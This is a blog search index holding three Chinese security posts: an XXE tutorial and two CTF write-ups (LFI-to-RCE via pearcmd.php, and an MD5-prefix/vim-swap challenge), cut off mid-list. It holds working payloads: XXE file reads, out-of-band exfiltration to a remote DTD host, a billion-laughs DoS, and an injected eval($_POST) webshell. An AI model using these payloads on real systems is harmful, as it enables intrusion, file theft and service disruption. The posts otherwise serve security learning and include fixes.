<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XXE外部注入实体漏洞_php</title>
      <link href="/2024/07/10/XXE%E5%A4%96%E9%83%A8%E6%B3%A8%E5%85%A5%E5%AE%9E%E4%BD%93%E6%BC%8F%E6%B4%9E-php/"/>
      <url>/2024/07/10/XXE%E5%A4%96%E9%83%A8%E6%B3%A8%E5%85%A5%E5%AE%9E%E4%BD%93%E6%BC%8F%E6%B4%9E-php/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE外部实体漏洞"><a href="#XXE外部实体漏洞" class="headerlink" title="XXE外部实体漏洞"></a>XXE外部实体漏洞</h1><h2 id="XML和DTD"><a href="#XML和DTD" class="headerlink" title="XML和DTD"></a>XML和DTD</h2><h3 id="XML与HTML的区别"><a href="#XML与HTML的区别" class="headerlink" title="XML与HTML的区别"></a>XML与HTML的区别</h3><p>XML是被设计为传输和存储数据，其焦点是数据的内容</p><p>HTML被设计用来显示数据，其焦点是数据的外观</p><p>HTML主要是显示信息，而XML主要传输信息</p><p>所以，如果不严谨的话，就会造成XML去传输一些恶意的信息</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置（就是有上传xml文件的入口点），没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><h3 id="XML的格式"><a href="#XML的格式" class="headerlink" title="XML的格式"></a>XML的格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; //声明XML文档</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;//DTD文档定义类型</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;//文档元素，元素是自由设定的。</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt; //但是一定要有根元素和分支，并且正确嵌套</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="DTD（文档定义类型）-实体"><a href="#DTD（文档定义类型）-实体" class="headerlink" title="DTD（文档定义类型）-实体"></a>DTD（文档定义类型）-实体</h3><p><strong>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</strong></p><p><strong>实体引用是对实体的引用。</strong></p><p><strong>实体可在内部或外部进行声明。</strong></p><h5 id="作用是定义XML文档的合法构建模块，可内部声明，也可外部引用，这个也是外部实体注入的关键地方"><a href="#作用是定义XML文档的合法构建模块，可内部声明，也可外部引用，这个也是外部实体注入的关键地方" class="headerlink" title="作用是定义XML文档的合法构建模块，可内部声明，也可外部引用，这个也是外部实体注入的关键地方"></a>作用是定义XML文档的合法构建模块，可内部声明，也可外部引用，这个也是外部实体注入的关键地方</h5><h4 id="内部实体的声明"><a href="#内部实体的声明" class="headerlink" title="内部实体的声明"></a>内部实体的声明</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line"></span><br><span class="line">DTD中：</span><br><span class="line">例子：</span><br><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML中：</span><br><span class="line">一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</span><br><span class="line">例子;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><h4 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">语法:</span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line"></span><br><span class="line">DTD中：</span><br><span class="line">例子：</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.baidu.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML中：</span><br><span class="line">例子：</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="XML外部实体注入"><a href="#XML外部实体注入" class="headerlink" title="XML外部实体注入"></a>XML外部实体注入</h3><p>当允许引用外部实体时，由于XML注重于数据的传输，所以通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p><h4 id="方式1"><a href="#方式1" class="headerlink" title="方式1:"></a>方式1:</h4><h4 id="通过协议来引用，不过不同的程序支持的协议不一样"><a href="#通过协议来引用，不过不同的程序支持的协议不一样" class="headerlink" title="通过协议来引用，不过不同的程序支持的协议不一样"></a>通过协议来引用，不过不同的程序支持的协议不一样</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407091426966.png" alt="img"></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">    &lt;!ENTITY Y SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;user&gt;&amp;Y&lt;/user&gt;</span><br><span class="line">//上传该文件就会返回/etc/passwd的内容</span><br></pre></td></tr></table></figure><h4 id="方式2："><a href="#方式2：" class="headerlink" title="方式2："></a>方式2：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">    &lt;!ENTITY Y SYSTEM &quot;http://www.baidu.com&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;user&gt;&amp;Y&lt;/user&gt;</span><br></pre></td></tr></table></figure><h4 id="方式3（数据外带—在xxe的盲注中可以使用）："><a href="#方式3（数据外带—在xxe的盲注中可以使用）：" class="headerlink" title="方式3（数据外带—在xxe的盲注中可以使用）："></a>方式3（数据外带—在xxe的盲注中可以使用）：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [   </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://174.1.66.167/shell.dtd&quot;&gt;  </span><br><span class="line">%remote;  </span><br><span class="line">]&gt;  </span><br><span class="line">  </span><br><span class="line">shell.dtd  </span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://127.0.0.1:5555/?flag=%file;&#x27;&gt;&quot;&gt;  </span><br><span class="line">%int;  </span><br><span class="line">%send;</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407091658763.png" alt="img"></p><h4 id="方式4（内部DTD-参数外部实体）："><a href="#方式4（内部DTD-参数外部实体）：" class="headerlink" title="方式4（内部DTD+参数外部实体）："></a>方式4（内部DTD+参数外部实体）：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">&lt;!ENTITY %name SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">%name;</span><br><span class="line">]&gt;</span><br><span class="line">//注意：%name（参数实体）是在 DTD 中被引用的，而&amp;name（其余实体）实在 xml 文档中被引用</span><br><span class="line">的。</span><br></pre></td></tr></table></figure><h4 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">双重实体编码绕过</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;!DOCTYPE GVI [  </span><br><span class="line">  </span><br><span class="line">    &lt;!ENTITY % xml &quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#46;&amp;#116;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#62;&amp;#93;&amp;#62;&amp;#10;&amp;#60;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#60;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#38;&amp;#120;&amp;#120;&amp;#101;&amp;#59;&amp;#60;&amp;#47;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#10;&amp;#60;&amp;#47;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&quot;&gt;  </span><br><span class="line">  </span><br><span class="line">    %xml;</span><br><span class="line"></span><br><span class="line">编码内容:</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &gt;]&gt;  </span><br><span class="line">&lt;core&gt;  </span><br><span class="line">      &lt;message&gt;&amp;xxe;&lt;/message&gt;  </span><br><span class="line">&lt;/core&gt;</span><br></pre></td></tr></table></figure><h4 id="拒绝服务攻击代码"><a href="#拒绝服务攻击代码" class="headerlink" title="拒绝服务攻击代码"></a>拒绝服务攻击代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [ </span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt; </span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; </span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt; &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt; &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt; &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt; &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt; &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt; &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br><span class="line">&lt;--XML解析器尝试解析该文件时，由于DTD的定义指数级展开（即递归引用),举个例子，这里定义了一个lol的实体，实体还有“lol”的字符串，然后定义了一个lol2的实体，里面有10个&quot;lol&quot;的字符串，依次递推，一个lol3实体引用10个lol2实体，这样的话可以一直向服务器传输文件，也就是形成了DOS攻击，经过XML解析器解析后的内存占用会比其本身大的多。--&gt;</span><br></pre></td></tr></table></figure><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">xxe修复</span><br><span class="line"></span><br><span class="line">方案：使用开发语言提供的禁用外部实体的方法</span><br><span class="line"></span><br><span class="line">1.PHP：</span><br><span class="line">libxml\_disable\_entity\_loader(true);//设置为true时禁止解析xml外部实体</span><br><span class="line"></span><br><span class="line">2.JAVA:</span><br><span class="line">DocumentBuilderFactory dbf=DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">3.Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData=etree.parse(xmlSource,etree.XMLParser(resolve\_entities=False))</span><br></pre></td></tr></table></figure><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://www.cnblogs.com/happystudyhuan/p/11774626.html">XXE漏洞-再简单一点点</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/69">未知攻焉知防——XXE漏洞攻防</a></p><p><a href="https://blog.51cto.com/u_13953961/3107472">XXE外部实体注入漏洞——PHP</a></p><p><a href="https://blog.csdn.net/weixin_26750831/article/details/115201337?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172050770116800211510330%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=172050770116800211510330&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-6-115201337-null-null.142%5Ev100%5Epc_search_result_base2&utm_term=php%20xxe&spm=1018.2226.3001.4187">php xxe注入,XXE的原理利用方式及修复</a></p><p><a href="https://blog.csdn.net/logic1001/article/details/136590382?ops_request_misc=&request_id=&biz_id=102&utm_term=php%20xxe&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-136590382.142%5Ev100%5Epc_search_result_base2&spm=1018.2226.3001.4187">渗透攻击零基础学习-XXE（非常详细）零基础入门到精通，收藏这一篇就够了！！！</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[NewStarCTF 2023 公开赛道]Include 🍐--LFI to RCE</title>
      <link href="/2024/07/10/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Include-%F0%9F%8D%90-LFI-to-RCE/"/>
      <url>/2024/07/10/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Include-%F0%9F%8D%90-LFI-to-RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="NewStarCTF-2023-公开赛道-Include-🍐"><a href="#NewStarCTF-2023-公开赛道-Include-🍐" class="headerlink" title="[NewStarCTF 2023 公开赛道]Include 🍐"></a>[NewStarCTF 2023 公开赛道]Include 🍐</h1><p>上来看到源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>传一个phpinfo看看是什么</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101549638.png" alt="img"></p><p>一个假的flag，不过这是个提示，那我们看一下register_argc_argv是什么玩意</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101552331.png" alt="img"></p><p>开启状态，那我就得查查资料了，这个register_argc_argv的作用</p><p>直接放文章链接：<a href="https://cloud.tencent.com/developer/article/2204400">https://cloud.tencent.com/developer/article/2204400</a>     <a href="https://www.cnblogs.com/Yu--/p/15788689.html">https://www.cnblogs.com/Yu--/p/15788689.html</a>      <a href="https://blog.csdn.net/weixin_53090346/article/details/127241278">https://blog.csdn.net/weixin_53090346/article/details/127241278</a></p><p>这个主要是用的是包含pearcmd.php这个文件来执行命令，然后借用大佬的图哈</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101557767.png" alt="img"></p><p>可以看到，里面有一个config-create参数，这个就是去创建文件的命令，不过要用+来隔开（底层原因：<a href="https://xz.aliyun.com/t/11089?time__1311=Cq0x2Qi=omq7qGNDQieiKO+mjowcGAbD#toc-0%EF%BC%89">https://xz.aliyun.com/t/11089?time__1311=Cq0x2Qi%3Domq7qGNDQieiKO%2BmjowcGAbD#toc-0）</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">所以，构造我们的payload</span><br><span class="line">?file=/usr/local/lib/php/pearcmd&amp;+config-create+/<span class="meta">&lt;?=</span>@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])<span class="meta">?&gt;</span>+./a.php</span><br><span class="line">不同的系统pearcmd存放的位置好像不一定， 有的在/usr/share/php/pearcmd.php。</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101614305.png" alt="img"></p><p>注意：用BP进行操作，不然在浏览器中&lt;&gt;就会被URL编码，就会导致我们的马不管用了</p><p>然后，POST传入执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=./a</span><br><span class="line">POST:a=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /f*&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101621878.png" alt="img"></p><p>本题考查的是LFI文件包含和RCE的结合，关键点是在pearcmd.php上，不过这种使用方法只能是register_argc_argv开启状态才行。不过如果可以上传文件的话，可以进行上传容器配置文件来改变关闭状态（参考：<a href="https://cloud.tencent.com/developer/article/2204400%EF%BC%89">https://cloud.tencent.com/developer/article/2204400）</a></p><p>当然，LFI可以做的事还很多比如还可以提权（参考文章:<a href="https://www.freebuf.com/articles/web/253102.html%EF%BC%89">https://www.freebuf.com/articles/web/253102.html）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> LFI </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[极客大挑战 2020]Roamphp4-Rceme WP</title>
      <link href="/2024/06/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp4-Rceme-WP/"/>
      <url>/2024/06/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp4-Rceme-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="极客大挑战-2020-Roamphp4-Rceme"><a href="#极客大挑战-2020-Roamphp4-Rceme" class="headerlink" title="[极客大挑战 2020]Roamphp4-Rceme"></a>[极客大挑战 2020]Roamphp4-Rceme</h1><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042050251.png" alt="img"></p><p>进入题目，可以看到，大概意思就是如果code的md5值前5位是3e16b，那么就会执行命令</p><p>这边给出一个md5生成脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> hashlib.md5(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">&#x27;0e788&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>查看源码，发现提示</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042051889.png" alt="img"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">vim swp，.swp文件是vim使用不当而生成的一个文件，这种文件一般都是“坏的”，查看原来内容需要vim -r</span><br><span class="line">要直接用 Vim 打开一个 .swp 文件，你可以采取以下步骤。一般情况下，.swp 文件是二进制文件，直接编辑它并不常见，但你可能会希望查看其内容。</span><br><span class="line"></span><br><span class="line">1. 打开 .swp 文件</span><br><span class="line">你可以用 vim 命令直接打开 .swp 文件。例如：</span><br><span class="line">vim example.txt.swp</span><br><span class="line"></span><br><span class="line">2. 使用 :recover 命令恢复文件</span><br><span class="line">如果你的目的是从交换文件中恢复数据，可以使用 :recover 命令。假设你有一个交换文件 example.txt.swp，你可以这样做：</span><br><span class="line">vim -r example.txt</span><br><span class="line"></span><br><span class="line">3. 手动打开 .swp 文件查看内容</span><br><span class="line">如果你只想查看 .swp 文件的内容，尽管它是二进制文件，你可以使用 Vim 的二进制模式来查看。注意，这不是常见操作，而且通常不会有很好的阅读体验，但可以帮助你检查交换文件的一些细节。步骤如下：</span><br><span class="line">vim -b example.txt.swp</span><br><span class="line"></span><br><span class="line">在 Vim 中，使用以下命令可以切换到十六进制模式，这样你可以更方便地查看二进制内容：</span><br><span class="line">:%!xxd</span><br><span class="line"></span><br><span class="line">要返回普通模式，可以使用：</span><br><span class="line">:%!xxd -r</span><br><span class="line"></span><br><span class="line">4. 使用 xxd 查看 .swp 文件</span><br><span class="line">你也可以使用 xxd 命令来查看 .swp 文件的内容：</span><br><span class="line">xxd example.txt.swp | less</span><br><span class="line">这会将 .swp 文件转换为十六进制显示，便于查看。</span><br><span class="line"></span><br><span class="line">5. 确定如何处理 .swp 文件</span><br><span class="line">大多数情况下，你需要根据 Vim 的提示来决定如何处理 .swp 文件。例如，当你尝试打开一个文件时，Vim 会提示交换文件已经存在，并给出几种处理选项：</span><br><span class="line"></span><br><span class="line">O: 只读打开文件。</span><br><span class="line">E: 继续编辑文件，忽略交换文件。</span><br><span class="line">R: 恢复文件，尝试从交换文件中恢复数据。</span><br><span class="line">D: 删除交换文件，通常在确认没有其他 Vim 实例在编辑该文件时使用。</span><br><span class="line">Q: 